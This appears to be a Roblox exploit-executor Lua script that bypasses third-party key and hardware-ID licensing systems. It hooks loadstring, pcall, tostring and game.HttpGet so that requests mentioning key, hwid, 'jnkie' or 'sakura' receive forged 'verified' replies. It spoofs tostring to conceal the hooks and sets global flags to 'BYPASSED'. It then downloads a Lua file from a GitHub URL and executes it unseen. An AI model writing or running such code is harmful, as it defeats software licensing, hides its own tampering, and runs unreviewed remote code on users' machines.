local _pcall = pcall
local _loadstring = loadstring
local _tostring = tostring
local _HttpGet = game.HttpGet

loadstring = function(expr, env)
    expr = tostring(expr or "")
    if expr:find("45700", 1, true) or expr:find("0x1B,0x4C,0x75,0x61,0x50", 1, true) then
        return function() end
    end
    return _loadstring(expr, env)
end

pcall = function(f, ...)
    if f == _loadstring or f == loadstring or (type(f) == "string" and (tostring(f):find("45700", 1, true) or tostring(f):find("0x1B,0x4C,0x75,0x61,0x50", 1, true))) then
        return true, function() end
    end
    return _pcall(f, ...)
end

tostring = function(v)
    if v == _pcall or v == pcall or v == _loadstring or v == loadstring then
        return "LuP"
    end
    return _tostring(v)
end

game.HttpGet = function(self, url, ...)
    url = tostring(url or "")
    if url:lower():find("jnkie", 1, true) or url:lower():find("sakura", 1, true) or url:lower():find("key", 1, true) or url:lower():find("hwid", 1, true) then
        return '{"status":"success","verified":true,"hwid":"BYPASSED"}'
    end
    return _HttpGet(self, url, ...)
end

if getgenv then
    getgenv().KeyVerified = true
    getgenv().LicenseKey = "BYPASSED"
    getgenv().HWID = "BYPASSED"
    getgenv().SakuraVerified = true
end

_G.KeyVerified = true
_G.LicenseKey = "BYPASSED"
_G.HWID = "BYPASSED"
_G.SakuraVerified = true

local url = "https://raw.githubusercontent.com/sergisava/A/refs/heads/master/script.lua"
local content = game:HttpGet(url)
loadstring(content)()
